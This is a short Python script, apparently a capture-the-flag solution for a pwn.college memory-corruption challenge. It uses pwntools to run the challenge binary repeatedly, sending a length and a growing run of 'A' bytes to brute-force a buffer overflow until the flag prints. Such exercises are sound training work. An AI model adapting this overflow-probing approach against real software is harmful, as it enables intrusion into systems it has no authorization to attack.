from pwn import *
file = "/challenge/babymem_level14.0"

for i in range(512):
    p = process(file)
    p.sendline(bytes(str(i), 'ascii'))
    p.sendline(b'A'*i)

    try:
        p.recvuntil(b'pwn.college')
        flag = p.recvline()
        break
    except:
        p.close()

print(b'pwn.college' + flag)
